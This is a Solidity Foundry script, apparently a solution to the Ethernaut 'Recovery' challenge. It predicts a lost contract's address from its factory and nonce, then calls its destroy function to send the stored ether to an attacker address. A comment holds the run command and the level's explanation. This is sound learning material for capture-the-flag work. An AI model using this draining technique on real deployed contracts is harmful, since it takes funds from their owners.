// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

contract RecoverSolver is Script, HelperConfigLib {
    function run(address _factoryAddr) external {
        address payable recoveredAddress = payable(
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xd6),
                                bytes1(0x94),
                                address(_factoryAddr),
                                bytes1(0x01)
                            )
                        )
                    )
                )
            )
        );

        console.log(recoveredAddress);

        vm.startBroadcast();

        require(
            recoveredAddress.balance == 0.001 ether,
            "Contract has no balance"
        );

        (bool success, ) = recoveredAddress.call(
            abi.encodeWithSignature(
                "destroy(address)",
                payable(ATTACKER_ADDRESS)
            )
        );

        require(success == true, "call failed");

        require(recoveredAddress.balance == 0, "contract still has balance");

        vm.stopBroadcast();
    }
}

/**
 * forge script script/RecoverSolver.s.sol:RecoverSolver --sig "run(address)" <RECOVERY-LEVEL-CONTRACT-ADDRESS> --rpc-url http://localhost:8545 -vvv --broadcast --private-key <PRIVATE-KEY>
 *
 * refered following links:
 * https://swende.se/blog/Ethereum_quirks_and_vulns.html
 * https://stermi.xyz/blog/ethernaut-challenge-17-solution-recovery
 * https://stermi.xyz/blog/lets-play-evm-puzzles
 * https://ethereum.org/developers/docs/data-structures-and-encoding/rlp/
 * 
 
 Success Message:
    Contract addresses are deterministic and are calculated by keccak256(address, nonce) where the address is the address of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).

    Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.

    An interesting blog post by Martin Swende (https://swende.se/blog/Ethereum_quirks_and_vulns.html) details potential use cases of this.

    If you're going to implement this technique, make sure you don't miss the nonce, or your funds will be lost forever.
 */
